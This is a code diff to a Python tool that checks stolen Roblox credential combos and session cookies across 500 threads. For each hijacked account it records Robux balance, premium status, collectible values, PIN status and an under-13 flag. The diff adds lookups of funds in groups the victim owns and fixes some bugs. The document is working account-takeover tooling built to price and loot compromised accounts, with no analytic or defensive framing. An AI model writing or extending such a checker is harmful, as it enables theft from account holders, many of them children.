@@ -9,7 +9,8 @@ import time
 import socket
 
 THREAD_COUNT = 500
-TASKS = ["robux", "premium", "collectibles", "settings", "pin"]
+TASKS = ["robux", "premium", "collectibles", "settings", "pin", "group_funds"]
+ITEM_VALUES = get_rolimons()
 WRITE_FIELDS = [
     (
         "Id",
@@ -29,6 +30,12 @@ WRITE_FIELDS = [
     (
         "Robux Balance",
         lambda c: c.robux
+    ),
+
+    (
+        "Total Group Funds",
+        lambda c: sum([i["group"].get("robux", 0) for i in c.groups
+                       if i["role"]["rank"] >= 255])
     ),
 
     (
@@ -59,6 +66,11 @@ WRITE_FIELDS = [
     ),
 
     (
+        "Under 13",
+        lambda c: c.under_13
+    ),
+
+    (
         "Collectible List",
         lambda c: format_collectibles(c.collectibles, ITEM_VALUES)
     ),
@@ -69,7 +81,6 @@ WRITE_FIELDS = [
     )
 ]
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
-ITEM_VALUES = get_rolimons()
 
 queue = None
 for fname in ["cracked.txt", "combos.txt", "combos_and_cookies.txt", "cookies.txt"]:
@@ -144,6 +155,7 @@ class UserCache:
         self.above_13 = None
         self.previous_names = None
         self.pin_enabled = None
+        self.groups = None
 
     def is_done(self, name):
         return not name in self._tasks
@@ -214,7 +226,7 @@ class Worker(Thread):
                         f"https://economy.roblox.com/v1/users/{session.id}/currency"
                     ) as resp:
                         cache.robux = resp.json()["robux"]
-                        cache.complete("robux")
+                    cache.complete("robux")
                 
                 if not cache.is_done("premium"):
                     with session.request(
@@ -225,7 +237,7 @@ class Worker(Thread):
                         if data:
                             cache.premium_stipend = data["robuxStipendAmount"]
                             cache.premium_expiry_date = data["expiration"]
-                        cache.complete("premium")
+                    cache.complete("premium")
 
                 if not cache.is_done("collectibles"):
                     collectibles = []
@@ -258,7 +270,7 @@ class Worker(Thread):
                         cache.email_verified = data["IsEmailVerified"]
                         cache.above_13 = data["UserAbove13"]
                         cache.previous_names = [x for x in data["PreviousUserNames"].split(", ") if x]
-                        cache.complete("settings")
+                    cache.complete("settings")
                 
                 if not cache.is_done("pin"):
                     with session.request(
@@ -267,7 +279,26 @@ class Worker(Thread):
                     ) as resp:
                         data = resp.json()
                         cache.pin_enabled = data["isEnabled"]
-                        cache.complete("pin")
+                    cache.complete("pin")
+
+                if not cache.is_done("groups"):
+                    groups = []
+                    with session.request(
+                        "GET",
+                        f"https://groups.roblox.com/v2/users/{session.id}/groups/roles"
+                    ) as resp:
+                        data = resp.json()["data"]
+                        for item in data:
+                            item["group"]["robux"] = 0
+                            if item["role"]["rank"] >= 255:
+                                with session.request(
+                                    "GET",
+                                    f"https://economy.roblox.com/v1/groups/{item['group']['id']}/currency"
+                                ) as resp:
+                                    item["group"]["robux"] = resp.json().get("robux", 0)
+                            groups.append(item)
+                    cache.groups = groups
+                    cache.complete("groups")
 
                 complete_callback(cache)
                 counter.add()
@@ -306,7 +337,7 @@ class Worker(Thread):
         self.manager.clear()
 
 TitleUpdateWorker().start()
-workers = [Worker().start() for _ in range(THREAD_COUNT)]
+workers = [Worker() for _ in range(THREAD_COUNT)]
 for w in workers: w.start()
 for w in workers: w.join()
 
